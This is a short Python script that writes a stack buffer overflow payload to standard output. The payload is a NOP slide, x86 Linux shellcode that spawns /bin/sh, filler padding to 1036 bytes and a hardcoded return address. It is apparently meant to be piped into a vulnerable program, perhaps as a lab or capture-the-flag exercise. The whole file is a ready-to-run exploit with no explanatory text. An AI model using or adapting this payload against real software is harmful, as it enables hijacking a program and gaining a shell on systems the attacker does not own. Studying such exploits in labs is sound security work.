#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
nop_slide = b"\x90"*256
padding = b"A"*(1036 - len(shellcode + nop_slide))

return_addr = b"\x21\x86\xfe\xff"

sys.stdout.buffer.write(nop_slide + shellcode + padding + return_addr)
